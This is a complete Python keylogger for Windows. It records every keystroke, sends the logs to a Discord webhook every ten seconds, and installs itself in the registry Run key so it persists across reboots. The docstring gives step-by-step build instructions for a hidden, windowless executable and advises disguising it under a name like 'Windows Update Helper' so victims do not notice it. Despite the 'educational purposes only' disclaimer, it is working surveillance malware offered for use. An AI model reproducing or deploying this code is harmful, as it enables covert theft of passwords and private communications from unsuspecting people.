import requests
import threading
import os
import sys
import winreg
from pynput import keyboard

"""
This simple keylogger will send key presses to a discord webhook. It works by compiling python script into a .exe file that can be run on any pc,
regardless if python is installed. The .exe file will run in the background (with no terminal) and send logs to the discord webhook every x seconds. 
Polling rate, application name, and webhook url can and should be adjusted. This script is for educational purposes only and should not be used for 
malicious purposes.

Note: If you would like the program to be named something else, change the name in the pyinsstaller command. You may also want to do the same in the
windows registry, so that it does not show the user the program running is a keylogger. Instructions will be provided below. 

To create the .exe file, follow these steps:

 Step 1: Change WEBHOOK_URL to your discord webhook.
 Step 2: Change "Keylogger" on line 64 to anything you want, if desired (this is what will show up in the registry and in the task manager).
 Step 3: Change the number in the threading.Timer() function to adjust the polling delay.
 Step 4: Use 'pyinstaller --onefile --noconsole --name "Keylogger" webhooklogger.py' in the terminal in the directory of the script to create .exe file. 
            (Note: Just rename "Keylogger" to whatever you want ex. Windows Update Helper)
 Step 5: Run .exe file.
 Step 6: The keylogger will now run in the background and send logs to your discord webhook every x seconds.

 If you would like to remove the program from the registry, use the following command:
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Keylogger" /f
"""

log = ""
# Replace next line with your webhook URL.
WEBHOOK_URL = 'REPLACE THIS'

def report():
    global log
    if log:
        requests.post(WEBHOOK_URL, json={"content": log})
        log = ""
    
    timer = threading.Timer(10, report)
    timer.start()

def on_press(key):
    global log
    try:     
        log = log + key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log = log + " "
        elif key == keyboard.Key.enter:
            log = log + "\n"
        else:
            log = log + ('[' + str(key) + ']')

    
# Get path to exetuable, open registry key, and add to run.
# Note: Can change name from "Keylogger" to anything you want.
def add_to_startup():
    if getattr(sys, 'frozen', False): # Support left in if user wants to run as just a python script and not as .exe.
        path = sys.executable
    else:
        path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Keylogger", 0, winreg.REG_SZ, path)
    winreg.CloseKey(key)

if __name__ == "__main__":
    add_to_startup()
    report()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()